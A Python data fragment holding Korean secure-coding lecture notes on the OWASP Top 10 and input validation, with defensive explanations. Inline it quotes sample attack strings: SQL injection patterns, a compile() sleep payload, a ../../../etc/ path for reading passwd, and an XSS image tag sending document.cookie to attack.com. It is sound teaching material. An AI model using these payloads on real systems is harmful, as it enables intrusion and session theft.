                "Insecure Design과 Security Misconfiguration을 구현 실수와 구분해 이해한다.",
            ],
            "sections": [
                {
                    "heading": "OWASP Top 10의 의미",
                    "body": f"""
                    <p>2강은 취약점 및 공격 유형을 OWASP Top 10을 중심으로 설명한다. OWASP Top 10은 웹 애플리케이션 보안에서 가장 중요하게 다뤄지는 10가지 취약점 유형을 정리한 목록이다. 강의에서는 이 목록이 OWASP 커뮤니티에서 개발·유지 관리되며, 웹 개발자와 보안 전문가가 웹 애플리케이션을 만들거나 점검할 때 널리 사용하는 기준이라고 설명한다.</p>
                    {sc02_owasp}
                    <p>OWASP Top 10은 한 번 정해진 뒤 고정되는 목록이 아니다. 2017년판과 2021년판처럼 시간이 지나면서 실제 사고와 개발 환경의 변화가 반영된다. 어떤 취약점은 순위가 올라가고, 어떤 항목은 통합되거나 새롭게 들어온다. 그래서 이 목록은 단순 암기표가 아니라 현재 웹 보안에서 무엇을 특히 조심해야 하는지 보여 주는 기준선으로 봐야 한다.</p>
                    <p>2강에서는 2021년 기준 상위 항목 중 <strong>Broken Access Control</strong>, <strong>Cryptographic Failures</strong>, <strong>Injection</strong>, <strong>Insecure Design</strong>, <strong>Security Misconfiguration</strong>을 다룬다. 각각은 코드 작성 습관, 암호 적용, 입력 처리, 설계, 운영 설정처럼 서로 다른 위치에서 발생하므로 같은 “취약점”이라는 말로 묶더라도 원인과 대응 방식이 다르다.</p>
                    """,
                },
                {
                    "heading": "Broken Access Control",
                    "body": f"""
                    <p>첫 번째 항목은 Broken Access Control, 즉 접근 제어 실패다. 소프트웨어는 사용자마다 허용되는 행동과 볼 수 있는 데이터가 다르다는 전제를 코드로 강제해야 한다. 일반 사용자는 자기 게시글을 작성·수정할 수 있지만 다른 사용자의 개인정보를 볼 수 없고, 관리자 설정을 바꿀 수도 없어야 한다. 이 경계가 깨지면 사용자는 자기 권한을 넘어서는 기능을 실행하거나 데이터를 열람할 수 있다.</p>
                    <p>강의는 보안에서 중요한 원칙으로 <strong>최소 권한의 원칙</strong>을 강조한다. 필요한 권한만 주고, 필요하지 않은 권한은 주지 않는다는 뜻이다. 접근 제어 실패는 이 원칙을 어겼거나, 권한 검사를 우회할 수 있게 만들었거나, API 요청에는 권한 검사를 넣지 않은 경우에 발생한다.</p>
                    {sc02_access_control}
                    <p>슬라이드가 제시한 대표 유형은 최소 권한 원칙 위반, URL 변경이나 내부 상태 조작을 통한 접근 제어 우회, 다른 사용자 정보 접근, POST·PUT·DELETE 같은 API의 접근 제어 누락, 일반 사용자에서 관리자 권한으로 올라가는 권한 상승이다. 웹 화면 버튼을 숨기는 것만으로는 충분하지 않다. 공격자는 브라우저 개발자 도구, 직접 만든 요청, API 호출을 통해 서버에 요청을 보낼 수 있으므로 서버 코드에서 권한을 다시 확인해야 한다.</p>
                    {sc02_url_tampering}
                    <p>URL 매개변수 조작 예시는 접근 제어 실패를 가장 직관적으로 보여 준다. 아래 코드는 <code>user_id</code>를 받아 해당 사용자의 프로필을 조회하고 그대로 렌더링한다.</p>
                    {access_control_vulnerable}
                    <p>문제는 “요청한 사람이 그 <code>user_id</code>의 주인인가?”를 확인하지 않는다는 점이다. 공격자가 <code>http://example.com/profile/?user_id=12345</code>처럼 URL을 직접 만들면, 서버는 12345번 사용자 정보가 요청자에게 보여도 되는지 확인하지 않고 조회할 수 있다. 강의에서 말한 것처럼 이 경우 12345번 사용자의 프로필 정보가 공격자에게 노출된다.</p>
                    <p>따라서 접근 제어는 화면에서 링크를 감추는 수준이 아니라 서버에서 현재 로그인 사용자, 요청 대상 리소스, 관리자 여부를 함께 확인해야 한다.</p>
                    {access_control_guard}
                    <p>위와 같은 방어 코드는 요청한 <code>user_id</code>가 현재 로그인한 사용자와 같은지 확인하고, 관리자가 아닌데 다른 사람 정보에 접근하려 하면 거부한다. 접근 제어 실패를 막는 핵심은 “클라이언트가 보낸 값”을 신뢰하지 않고, 서버가 권한을 다시 판단하는 것이다.</p>
                    """,
                },
                {
                    "heading": "Cryptographic Failures",
                    "body": f"""
                    <p>두 번째 항목은 Cryptographic Failures다. 이름 그대로 암호 기술을 사용하지 않았거나, 사용했더라도 잘못 사용해 민감정보가 노출되는 문제다. 로그인 아이디, 비밀번호, 세션 토큰, 개인정보, 결제 정보처럼 보호해야 하는 데이터가 평문으로 저장되거나 전송되면 공격자는 네트워크 스니핑, 로그 확인, 데이터베이스 유출을 통해 내용을 그대로 볼 수 있다.</p>
                    {sc02_crypto}
                    <p>강의에서는 오래된 알고리즘이나 프로토콜 사용을 대표 예로 든다. DES, MD5처럼 더 이상 안전하다고 보기 어려운 알고리즘을 계속 사용하면 “암호화를 했다”는 사실만으로 안전을 보장할 수 없다. 암호화 키를 기본값 그대로 두는 것도 위험하다. 누구나 알 수 있는 기본 키라면 암호문은 사실상 보호되지 않는다.</p>
                    <p>부채널 정보 노출도 언급된다. 암호 알고리즘 자체가 아니라 실행 시간, 전력 사용, 오류 반응, 처리 패턴 같은 주변 정보가 비밀을 추측하는 단서가 되는 경우다. 또한 HSTS 헤더를 적용하지 않으면 사용자가 HTTPS가 아닌 HTTP로 접근하는 과정에서 중간자 공격이나 평문 전송 위험이 커질 수 있다. 강의의 핵심은 민감정보 보호는 “암호화 함수 호출” 하나로 끝나는 것이 아니라, 안전한 알고리즘 선택, 키 관리, 전송 보안, 설정까지 함께 맞아야 한다는 점이다.</p>
                    """,
                },
                {
                    "heading": "Injection",
                    "body": f"""
                    <p>세 번째 항목은 Injection이다. 공격자가 악의적인 입력을 넣고, 그 입력이 서버 측 명령이나 쿼리의 일부로 해석되게 만드는 취약점이다. SQL Injection은 데이터베이스 쿼리에, XSS는 브라우저에서 실행되는 스크립트에, Command Injection은 운영체제 명령에 공격자의 입력이 섞이는 경우다.</p>
                    <p>강의에서는 SQL Injection을 로그인 예시로 설명한다. 사용자는 로그인 페이지에서 사용자 이름과 비밀번호를 입력한다. 그런데 서버가 그 값을 단순 데이터로 다루지 않고 SQL 문자열에 직접 끼워 넣으면, 공격자는 입력값 안에 SQL 문법을 섞어 쿼리 구조 자체를 바꿀 수 있다.</p>
                    {sc02_injection_code}
                    <p>슬라이드의 취약 코드는 다음과 같다.</p>
                    {sql_injection_vulnerable}
                    <p>핵심 문제는 <code>username</code>과 <code>password</code>가 <code>%s</code> 문자열 포맷으로 SQL에 직접 들어간다는 점이다. 공격자가 사용자 이름에 <code>'admin' OR 1=1; --</code> 같은 값을 넣으면, 원래는 “아이디와 비밀번호가 모두 일치하는 사용자”만 찾아야 하는 쿼리가 공격자가 의도한 조건을 포함하게 된다. <code>OR 1=1</code>은 항상 참이므로 인증 조건이 무력화될 수 있고, 주석 기호는 뒤쪽 조건을 흐리게 만들 수 있다.</p>
                    <p>강의에서 정리한 공격 흐름은 세 단계다. 먼저 사용자가 로그인 페이지에 값을 입력한다. 공격자는 그 입력값에 악성 SQL 코드를 삽입한다. 서버가 입력을 검증하거나 분리하지 않고 쿼리에 포함하면, 쿼리에 악성 코드가 포함되어 모든 사용자 정보가 노출될 수 있다. 대응의 기본은 사용자 입력을 쿼리 문자열에 직접 붙이지 않고, 매개변수화된 쿼리나 ORM의 안전한 바인딩 기능을 사용하는 것이다.</p>
                    """,
                },
                {
                    "heading": "Insecure Design",
                    "body": f"""
                    <p>네 번째 항목은 Insecure Design이다. 앞의 접근 제어 실패나 Injection이 특정 코드나 검증 누락으로 드러나는 경우가 많다면, Insecure Design은 더 앞 단계인 설계 과정에서 발생하는 보안 결함을 말한다. 즉 구현자가 코드를 열심히 작성했더라도, 요구사항과 설계 자체가 보안 통제를 충분히 담지 못하면 시스템 전체가 취약해질 수 있다.</p>
                    {sc02_insecure_design}
                    <p>슬라이드는 Insecure Design을 “다른 OWASP Top 10과 다르게 설계 자체의 문제”라고 설명한다. 취약점 발생 원인은 위협 분석 부족으로 보안 수준 설정에 실패하는 것이다. 예를 들어 로그인 기능을 설계하면서 계정 잠금, 비밀번호 정책, 세션 만료, 권한 분리, 민감 데이터 흐름을 고려하지 않으면 이후 구현 단계에서 임시 보완을 해도 근본 설계가 흔들릴 수 있다.</p>
                    <p>강의 화면은 요구사항분석, 설계, 구현, 테스트, 유지보수의 흐름도 함께 보여 준다. 요구사항 분석에서는 보안 항목을 식별하고 명세서에 반영해야 한다. 설계 단계에서는 위협 모델링으로 어떤 공격자가 어떤 경로로 들어올 수 있는지 도출하고, 보안 설계 검토와 보안 통제를 세워야 한다. 구현 단계에서는 표준 코딩 정의서와 개발 보안 가이드를 지켜야 하고, 테스트 단계에서는 모의침투 테스트나 동적 분석으로 보안 취약점을 진단해야 한다. 유지보수에서는 지속적인 개선과 보안 패치가 이어져야 한다.</p>
                    """,
                },
                {
                    "heading": "Security Misconfiguration",
                    "body": f"""
                    <p>다섯 번째 항목은 Security Misconfiguration이다. 보안 기능이 존재하더라도 제대로 설정하지 않으면 취약점이 된다. 프레임워크, 서버, 클라우드, 데이터베이스는 보안을 위한 설정을 제공하지만, 개발자나 운영자가 기본값을 그대로 두거나 불필요한 기능을 켜 두면 공격 표면이 늘어난다.</p>
                    {sc02_misconfiguration}
                    <table>
                      <thead><tr><th>잘못된 설정</th><th>위험</th></tr></thead>
                      <tbody>
                        <tr><td>불필요한 포트와 기능 활성화</td><td>공격자가 분석할 표면이 늘어난다.</td></tr>
                        <tr><td>기본 관리자 계정 사용</td><td>공개된 기본 아이디와 비밀번호로 접속될 수 있다.</td></tr>
                        <tr><td>관리자 페이지 기본 경로 사용</td><td>공격자가 쉽게 관리 화면을 찾을 수 있다.</td></tr>
                        <tr><td>오류 메시지 노출</td><td>경로, 프레임워크, 내부 코드 정보가 공격자에게 힌트가 된다.</td></tr>
                        <tr><td>업그레이드 시 보안 기능 미적용</td><td>새 버전의 보안 설정을 놓쳐 취약한 상태가 유지된다.</td></tr>
                      </tbody>
                    </table>
                    <p>강의에서는 부적절한 보안 강화, 불필요한 기능 사용, 디폴트 계정 사용, 에러 메시지 노출, 업그레이드 시 최신 보안 기능 미사용을 예로 든다. 특히 에러 메시지가 내부 경로, 프레임워크 정보, SQL 오류, 스택 트레이스를 그대로 보여 주면 공격자는 그 정보를 기반으로 다음 공격을 설계할 수 있다.</p>
                    {sc02_default_admin}
                    <p>기본 관리자 경로도 중요한 예시다. 서비스를 만들 때 관리 페이지가 <code>/admin</code> 같은 기본 경로에 그대로 있고, 기본 아이디와 비밀번호까지 바꾸지 않았다면 공격자는 너무 쉽게 관리 화면을 찾고 로그인 시도를 할 수 있다. 강의는 “기본값”이 편리하지만, 운영 환경에서는 그대로 두는 순간 공격자에게 힌트가 된다고 설명한다. 따라서 불필요한 기능 제거, 기본 계정 비활성화, 관리자 경로와 접근 제한 설정, 상세 오류 메시지 비공개, 보안 패치와 업그레이드 반영이 필요하다.</p>
                    """,
                },
            ],
            "checks": [
                "OWASP Top 10이 웹 보안에서 어떤 역할을 하는지 설명할 수 있는가?",
                "Broken Access Control을 최소 권한 원칙과 연결해 말할 수 있는가?",
                "암호화를 했더라도 약한 알고리즘이나 평문 전송이 왜 문제인지 이해했는가?",
                "Injection에서 사용자 입력이 명령이나 쿼리 일부가 되는 위험을 설명할 수 있는가?",
                "Insecure Design과 Security Misconfiguration의 차이를 구분할 수 있는가?",
            ],
        },
        {
            "id": "1-3",
            "title": "OWASP Top 10 2부",
            "subtitle": "취약하고 오래된 구성요소, 식별·인증 실패, 무결성 실패, 로깅·모니터링 실패, SSRF와 OWASP 학습 자원을 정리한다.",
            "tags": ["OWASP", "인증", "무결성"],
            "objectives": [
                "Vulnerable and Outdated Components가 알려진 취약점 재사용 공격으로 이어지는 이유를 이해한다.",
                "Identification and Authentication Failures에서 브루트포스, 약한 비밀번호, 세션 노출을 설명한다.",
                "Software and Data Integrity Failures에서 해시 검증과 신뢰할 수 없는 직렬화 데이터의 위험을 이해한다.",
                "Security Logging and Monitoring Failures가 사고 원인 파악과 대응을 어렵게 만드는 이유를 설명한다.",
                "OWASP가 Top 10 외에도 LLM, API, Juice Shop 같은 학습 자원을 제공한다는 점을 파악한다.",
            ],
            "sections": [
                {
                    "heading": "Vulnerable and Outdated Components",
                    "body": f"""
                    <p>3강은 2강에 이어 OWASP Top 10의 나머지 항목을 다룬다. 여섯 번째 항목은 <strong>Vulnerable and Outdated Components</strong>, 즉 취약하거나 오래된 구성요소 사용이다. 강사는 많은 기업이 처음 개발할 때 선택한 패키지, 프레임워크, 라이브러리 위에 계속 기능을 붙여 가기 때문에 업데이트되지 않은 소프트웨어를 오래 사용하는 경우가 많다고 설명한다.</p>
                    {sc03_outdated}
                    <p>오래된 구성요소에는 운영체제, 웹·애플리케이션 서버, DBMS, 애플리케이션, API, 런타임 환경, 라이브러리 등이 모두 포함된다. 업데이트가 중요하다는 사실은 대부분 알고 있지만, 실제 운영 중인 서비스가 새 버전에서 깨질 수 있다는 걱정 때문에 업데이트를 미루는 일이 많다. 하지만 이 상태가 계속되면 이미 알려졌거나 패치된 취약점을 그대로 품고 서비스하게 된다.</p>
                    {sc03_django_cve}
                    <p>강의는 Django 취약점 예시를 들어 설명한다. 특정 Django 버전에서 CVE가 공개되고, 영향을 받는 버전과 대응 방법뿐 아니라 사용 방법과 exploit 코드까지 공개되어 있다면 공격자는 직접 취약점을 새로 찾을 필요가 없다. 업데이트 전 패키지를 쓰는 서비스를 발견하면 공개된 코드를 재활용해 공격할 수 있다.</p>
                    <p>따라서 구성요소 관리는 “최신 버전이면 좋다” 수준의 권고가 아니다. 사용하는 패키지와 버전을 파악하고, 취약점 공지를 확인하며, 호환성 테스트 후 패치를 적용하는 관리 절차가 필요하다. 호환성 때문에 즉시 업데이트가 어렵다면 방화벽, 접근 제한, 임시 완화책을 적용하고 업데이트 계획을 명확히 세워야 한다.</p>
                    """,
                },
                {
                    "heading": "Identification and Authentication Failures",
                    "body": f"""
                    <p>일곱 번째 항목은 <strong>Identification and Authentication Failures</strong>, 즉 식별·인증 및 세션 관리의 미흡이다. 사용자를 식별하고 인증하는 대표 과정은 로그인이다. 공격자는 다른 사람인 척 로그인하려고 시도하며, 가장 단순하지만 여전히 효과적인 방법이 브루트포스다.</p>
                    {sc03_auth_list}
                    <p>브루트포스 공격은 가능한 비밀번호 후보를 계속 시도하는 방식이다. 관리자 계정이 있다는 사실을 알면 공격자는 <code>password1</code>, <code>admin/admin</code>처럼 잘 알려진 비밀번호부터 시도하거나, 한 글자부터 가능한 조합을 계속 늘려 가며 로그인 성공을 노린다. 로그인 실패 횟수 제한, 일정 시간 차단, IP 제한, 추가 인증이 없으면 이런 반복 시도를 막기 어렵다.</p>
                    <p>강의는 URL에 세션 식별자가 노출되는 경우도 위험하다고 설명한다. 사용자가 로그인한 상태로 게시글 URL을 메신저에 공유했는데 그 URL 안에 세션 식별자가 들어 있다면, 받은 사람이 URL을 통해 보낸 사람인 척 접속할 수 있다. 성공 로그인 후 세션 식별자를 재사용할 수 있거나 세션 타임아웃이 없으면 같은 문제가 더 오래 지속된다.</p>
                    {sc03_bruteforce_code}
                    <p>슬라이드의 예시 코드는 사용자 이름을 알고 있을 때 반복 요청으로 비밀번호를 추측하는 흐름을 보여 준다.</p>
                    {brute_force_example}
                    <p>이 코드는 <code>api.example.com</code>의 사용자 정보를 요청한 뒤, 비밀번호를 숫자 문자열과 비교한다. 실제 시스템이 이런 식으로 비밀번호를 반환해서는 안 되며, 로그인 시도 횟수 제한이 없다면 공격자는 숫자 1만부터 천만, 사전 단어, 유출된 비밀번호 목록까지 계속 시도할 수 있다. 방어하려면 비밀번호 저장은 안전한 해시로 처리하고, 인증 API는 비밀번호를 절대 반환하지 않으며, 실패 횟수 제한과 잠금 정책을 적용해야 한다.</p>
                    """,
                },
                {
                    "heading": "Software and Data Integrity Failures",
                    "body": f"""
                    <p>여덟 번째 항목은 <strong>Software and Data Integrity Failures</strong>다. 소프트웨어나 데이터가 중간에 변조되지 않았는지 확인하지 않고 사용하는 문제다. 공식 사이트에서 소프트웨어를 배포할 때 MD5, SHA 계열 해시값을 함께 제공하는 이유는 다운로드한 파일이 공식 파일과 같은지 확인하기 위해서다.</p>
                    {sc03_integrity_list}
                    <p>신뢰할 수 없는 소스, 저장소, CDN의 플러그인이나 라이브러리에 의존하면 내가 받은 코드가 정말 원본인지 알기 어렵다. 안전하지 않은 CI/CD 파이프라인은 빌드와 배포 과정에서 악성 코드가 섞일 가능성을 만든다. 악성 업데이트를 그대로 적용하거나, 역직렬화 데이터의 무결성을 검증하지 않는 것도 같은 범주의 문제다.</p>
                    <p>강의는 공식 출처가 아닌 저장소나 토렌트에서 받은 소프트웨어를 예로 든다. 파일을 올린 사람이 백도어를 심었을 수도 있는데, 해시나 서명 검증 없이 실행하면 그 위험을 그대로 받아들이게 된다. 다운로드한 파일의 해시값과 공식 해시값이 일치하는지 확인하는 절차는 무결성 검증의 기본이다.</p>
                    {sc03_pickle_code}
                    <p>역직렬화 예시에서는 Python의 <code>pickle</code>을 사용한다.</p>
                    {pickle_integrity_example}
                    <p><code>pickle.dump()</code>는 객체를 파일로 직렬화하고, <code>pickle.load()</code>는 파일에서 객체를 복원한다. 문제는 신뢰할 수 없는 pickle 데이터가 단순 데이터가 아니라 로드 과정에서 코드 실행으로 이어질 수 있다는 점이다. 공격자가 악의적인 데이터를 <code>user_data.pkl</code>에 넣어 두고 애플리케이션이 이를 역직렬화하면, 데이터 복원이 아니라 시스템에서 악성 작업이 수행될 수 있다. 따라서 신뢰할 수 없는 직렬화 데이터는 사용하지 않거나, 서명과 해시로 무결성을 검증하고, 안전한 데이터 형식을 선택해야 한다.</p>
                    """,
                },
                {
                    "heading": "Security Logging and Monitoring Failures",
                    "body": f"""
                    <p>아홉 번째 항목은 <strong>Security Logging and Monitoring Failures</strong>다. 로그가 없으면 문제가 발생했을 때 무엇이 원인이었는지, 누가 어떤 입력으로 공격했는지, 어느 시점부터 침입이 시작되었는지 알 수 없다. 모니터링이 없거나 실패한 상태로 방치되면 공격이 진행 중이어도 알아차리기 어렵다.</p>
                    {sc03_logging_list}
                    <p>강의는 로그 백업 절차가 없는 경우, 불명확한 로깅과 모니터링을 하는 경우, 실시간 활동에 대한 로깅이 불가능한 경우, 일정 주기로 로그 백업을 하지 않는 경우를 예로 든다. 로그는 단순 저장 파일이 아니라 사고 원인 분석과 복구, 법적 증거 확보, 재발 방지에 필요한 자료다.</p>
                    {sc03_logging_code}
                    <p>슬라이드의 로그인 코드는 성공과 실패 메시지를 출력하지만, 보안 로그로 남겨야 할 정보가 거의 없다.</p>
                    {logging_failure_example}
                    <p>이 코드는 <code>print()</code>로 “로그인 성공” 또는 “잘못된 인증정보”만 보여 준다. 누가, 언제, 어느 IP에서, 어떤 계정으로, 몇 번째 실패를 했는지 저장하지 않는다. 브루트포스 같은 자동화 공격이 들어와도 서버가 받은 공격 활동과 침입 시점을 특정하기 어렵다. 실제 서비스에서는 인증 성공·실패, 관리자 작업, 권한 변경, 민감 데이터 접근, 비정상 요청을 구조화된 로그로 남기고, 로그 위변조 방지와 백업, 경보 체계를 함께 갖춰야 한다.</p>
                    """,
                },
                {
                    "heading": "OWASP Top 10 정리와 추가 학습",
                    "body": f"""
                    <p>강의는 여기까지 OWASP Top 10 항목을 정리하고, 열 번째 <strong>Server-Side Request Forgery</strong>는 이후 입력 검증과 SSRF를 다루는 시큐어 코딩 기법에서 더 자세히 설명한다고 안내한다. SSRF는 서버가 외부 요청을 대신 보내도록 만드는 취약점으로, 내부망 자원이나 메타데이터 서비스 접근으로 이어질 수 있다.</p>
                    {sc03_owasp_summary}
                    <p>정리하면 A01은 접근 권한 취약점, A02는 암호화 오류, A03은 인젝션, A04는 안전하지 않은 설계, A05는 보안 설정 오류다. 3강에서 이어서 본 A06은 취약하고 오래된 요소, A07은 식별 및 인증 오류, A08은 소프트웨어 및 데이터 무결성 오류, A09는 보안 로깅 및 모니터링 실패, A10은 서버 측 요청 위조다.</p>
                    <p>OWASP는 Top 10 목록만 제공하지 않는다. 강의는 최근 이슈인 LLM 보안, API 보안처럼 별도의 Top 10도 존재하고, 실습형 학습 자원도 제공한다고 설명한다.</p>
                    {sc03_juice_shop}
                    <p>OWASP Juice Shop은 쇼핑몰처럼 보이는 웹 애플리케이션 안에 여러 취약점이 의도적으로 들어 있는 워게임형 실습 환경이다. 2강과 3강에서 배운 접근 제어 실패, 인젝션, 인증 실패, 로깅 문제 같은 취약점이 실제 웹 기능 안에서 어떻게 보이는지 연습할 수 있다. 강의의 의도는 OWASP Top 10을 목록으로 외우는 데 그치지 않고, 실제 코드와 서비스 흐름 안에서 취약점이 어떻게 나타나는지 연결해 이해하는 것이다.</p>
                    """,
                },
            ],
            "checks": [
                "오래된 프레임워크나 라이브러리를 계속 쓰는 것이 왜 위험한지 설명할 수 있는가?",
                "브루트포스 공격을 막기 위해 로그인 시도 제한이 필요한 이유를 이해했는가?",
                "공식 해시값과 다운로드 파일 해시값을 비교해야 하는 이유를 말할 수 있는가?",
                "pickle 같은 역직렬화 데이터가 왜 코드 실행 위험을 가질 수 있는지 설명할 수 있는가?",
                "로깅과 모니터링이 단순 성공·실패 기록보다 더 많은 정보를 남겨야 하는 이유를 이해했는가?",
            ],
        },
        {
            "id": "1-4",
            "title": "입력 데이터 검증 1부",
            "subtitle": "SQL Injection, Code Injection, Path Traversal, XSS, Command Injection, 파일 업로드 취약점을 입력 검증 관점에서 정리한다.",
            "tags": ["입력 검증", "SQL Injection", "XSS"],
            "objectives": [
                "입력 데이터 검증이 시큐어 코딩에서 큰 비중을 차지하는 이유를 설명한다.",
                "SQL Injection을 막기 위해 사용자 입력을 쿼리 문자열에 직접 붙이지 않아야 함을 이해한다.",
                "eval 같은 코드 실행 함수와 사용자 입력을 결합할 때의 위험을 설명한다.",
                "Path Traversal, XSS, Command Injection, 파일 업로드 취약점의 발생 원리를 구분한다.",
                "화이트리스트, 확장자·용량·타입 제한, 안전한 API 사용으로 입력을 제한하는 방법을 정리한다.",
            ],
            "sections": [
                {
                    "heading": "입력 검증이 중요한 이유",
                    "body": f"""
                    <p>4강부터는 OWASP Top 10을 넘어 실제 시큐어 코딩 기법으로 들어간다. 이번 강의의 주제는 <strong>입력 데이터 검증 및 표현</strong>이다. 강사는 대부분의 해킹 공격이 악의적인 입력을 주는 방식으로 이루어지므로, 개발자가 어떤 입력을 허용하고 어떤 입력을 거부할지 잘 정하는 것만으로도 많은 공격을 줄일 수 있다고 설명한다.</p>
                    {sc04_outline}
                    <p>입력 데이터 검증은 시큐어 코딩 기법 중에서도 비중이 크다. 강의 목차에서 보안 기능, 시간 및 상태, 에러 처리, 코드 오류, API 오용 같은 다른 범주도 나오지만, 입력 검증 파트에는 SQL Injection, Code Injection, Path Traversal, XSS, Command Injection, File Upload, CSRF, SSRF 등 웹 공격의 핵심 유형이 몰려 있다.</p>
                    <p>핵심 원칙은 간단하다. 사용자가 보낸 값은 기본적으로 신뢰하지 않는다. 서버가 기대한 데이터 형식, 범위, 문자 집합, 파일 타입, 경로 안에 있는지 확인하고, 그 검사를 통과한 값만 실제 쿼리, 코드 실행, 파일 접근, HTML 출력, 시스템 명령, 파일 저장에 사용해야 한다.</p>
                    """,
                },
                {
                    "heading": "SQL Injection",
                    "body": f"""
                    <p>SQL Injection은 웹 서버가 데이터베이스와 상호작용하는 지점에서 발생한다. 로그인, 게시글 작성, 댓글 작성, 게시글 수정 같은 기능은 대부분 DB 쿼리를 실행한다. 공격자가 조작된 요청을 보내고, 서버가 그 입력을 쿼리 문자열의 일부로 사용하면 개발자가 의도한 것과 다른 DB 동작이 일어난다.</p>
                    {sc04_sql_flow}
                    <p>슬라이드의 공격 패턴은 <code>'or' 1=1</code>, <code>'having 1=1 --</code>, <code>Admin '--</code>, <code>union select</code>처럼 쿼리 문법을 바꾸는 문자열이다. 서버가 사용자 입력을 단순 데이터가 아니라 SQL 문법으로 해석하게 만들면 WHERE 조건이 무력화되거나, 원래 조회하지 말아야 할 데이터까지 가져올 수 있다.</p>
                    {sc04_sql_vulnerable}
                    <p>취약 코드는 <code>name</code>과 <code>content_id</code>를 POST에서 받은 뒤 문자열 연결로 <code>sql_query</code>를 만든다.</p>
                    {sql_update_vulnerable}
                    <p>여기서 <code>name</code>은 게시판 이름처럼 보이지만 실제로는 사용자가 보낸 임의 문자열이다. 공격자가 <code>name</code> 안에 따옴표, OR 조건, 주석 기호를 섞으면 전체 UPDATE 쿼리의 의미가 바뀔 수 있다. 입력값이 검증되지 않았고, 그 입력값이 SQL 문장 내부에 그대로 포함되는 것이 문제다.</p>
                    {sc04_sql_safe}
                    <p>방어 코드는 쿼리 문자열을 직접 이어 붙이지 않고 인자화된 쿼리를 사용한다.</p>
                    {parameterized_sql}
                    <p><code>sql_query</code>에는 <code>%s</code> 자리표시자만 두고, 실제 사용자 입력은 <code>curs.execute(sql_query, (name, content_id))</code>의 별도 인자로 넘긴다. 그러면 공격자가 특수 문자를 넣더라도 쿼리 문법으로 실행되지 않고 데이터 값으로 바인딩된다. SQL Injection 방어의 핵심은 입력값을 쿼리 구조와 분리하는 것이다.</p>
                    """,
                },
                {
                    "heading": "Code Injection",
                    "body": f"""
                    <p>Code Injection은 사용자의 입력이 서버에서 코드처럼 실행되는 문제다. Python의 <code>eval()</code>, <code>compile()</code>처럼 문자열을 코드로 해석하는 함수는 편리할 수 있지만, 외부 입력을 그대로 넣으면 공격자가 보낸 코드가 서버에서 실행될 수 있다.</p>
                    {sc04_code_flow}
                    <p>강의 예시는 <code>compile('for x in range(1):\\n import time\\n time.sleep(20)', 'a', 'single')</code>처럼 서버가 실행 가능한 파이썬 코드 문자열을 입력으로 받는 상황이다. 이 정도만으로도 웹 서버가 20초 동안 멈출 수 있고, 더 악의적인 입력이라면 백도어 설치나 정보 탈취 코드 실행으로 이어질 수 있다.</p>
                    {sc04_code_vulnerable}
                    <p>취약 코드는 POST의 <code>message</code> 값을 그대로 <code>eval()</code>에 전달한다.</p>
                    {code_injection_vulnerable}
                    <p><code>eval(message)</code>는 <code>message</code>를 단순 문자열이 아니라 파이썬 코드로 해석한다. 따라서 공격자가 보낸 입력이 산술식이든 함수 호출이든 서버 권한으로 실행될 수 있다. 사용자가 보낸 값을 코드 실행 함수에 전달하는 설계 자체가 매우 위험하다.</p>
                    {sc04_code_safe}
                    <p>화면의 방어 예시는 입력값을 영문·숫자로 제한한다.</p>
                    {input_validation}
                    <p><code>message.isalnum()</code>으로 알파벳과 숫자만 허용하면, 괄호, 따옴표, 점, 세미콜론, 언더스코어 같은 코드 구성 문자를 포함한 입력은 에러 페이지로 보낼 수 있다. 다만 가장 안전한 원칙은 사용자 입력을 애초에 코드로 실행하지 않는 것이다. 꼭 필요한 경우에도 허용 문자와 허용 표현식을 매우 좁게 잡아야 한다.</p>
                    """,
                },
                {
                    "heading": "Path Traversal",
                    "body": f"""
                    <p>Path Traversal은 파일 다운로드나 파일 읽기 기능에서 사용자가 보낸 파일명·경로를 악용해 허용된 디렉터리 밖의 파일에 접근하는 취약점이다. 웹 게시판의 첨부파일 다운로드 URL이 <code>filename</code>과 <code>path</code>를 입력으로 받는다면, 공격자는 <code>../</code>를 이용해 상위 디렉터리로 이동하려고 시도할 수 있다.</p>
                    {sc04_path_flow}
                    <p>슬라이드 예시는 정상 URL이 <code>http://www.victim.com/file/download/?filename=pic.jap&amp;path=data</code>인데, 변조 후에는 <code>filename=passwd&amp;path=../../../etc/</code>처럼 시스템 파일이 있는 경로를 가리킨다. 서버가 이 값을 그대로 파일 접근에 사용하면 <code>/etc/passwd</code> 같은 민감 파일을 읽게 될 수 있다.</p>
                    {sc04_path_vulnerable}
                    <p>취약 코드는 확장자만 검사하고 <code>request_file</code>을 그대로 <code>open()</code>에 전달한다.</p>
                    {path_traversal_vulnerable}
                    <p><code>.txt</code>, <code>.csv</code> 확장자만 확인하는 것은 충분하지 않다. 파일명 자체가 상위 경로를 포함할 수 있고, 경로 구분자가 들어가면 서버가 의도한 디렉터리 밖의 파일을 열 수 있다. 즉 “어떤 확장자인가”와 “어느 경로의 파일인가”는 별도로 검증해야 한다.</p>
                    {sc04_path_safe}
                    <p>화면의 방어 코드는 파일명에서 경로 조작 문자열을 제거한다.</p>
                    {safe_path}
                    <p><code>..</code>, <code>/</code>, 역슬래시를 제거하면 상위 경로 이동과 디렉터리 구분자 삽입을 줄일 수 있다. 실무에서는 여기에 더해 기준 디렉터리를 정하고, 정규화된 최종 경로가 그 기준 디렉터리 내부인지 확인하는 방식까지 함께 쓰는 것이 좋다.</p>
                    """,
                },
                {
                    "heading": "XSS",
                    "body": f"""
                    <p>XSS, Cross-Site Scripting은 공격자가 넣은 스크립트가 다른 사용자의 브라우저에서 실행되는 취약점이다. 게시글, 프로필 URL, 닉네임, 댓글처럼 사용자가 입력한 값이 HTML에 그대로 들어가면 공격자는 태그 구조를 깨고 스크립트나 이벤트 핸들러를 삽입할 수 있다.</p>
                    {sc04_xss_flow}
                    <p>슬라이드는 <code>&lt;img src="http://attack.com/dog.jpg?cookie="document.cookie&gt;</code> 형태의 공격 스크립트를 예로 든다. 공격자가 스크립트가 포함된 게시글을 등록하고, 다른 사용자가 그 게시글을 요청하면, 웹 서버는 공격 스크립트가 포함된 게시글 페이지를 응답한다. 사용자의 브라우저가 그 페이지를 렌더링하는 순간 공격자 스크립트가 실행될 수 있다.</p>
                    {sc04_xss_code}
                    <p>취약 코드에서는 사용자 입력으로 HTML 링크를 만들고, 이를 <code>mark_safe()</code>로 감싼다.</p>
                    {xss_vulnerable}
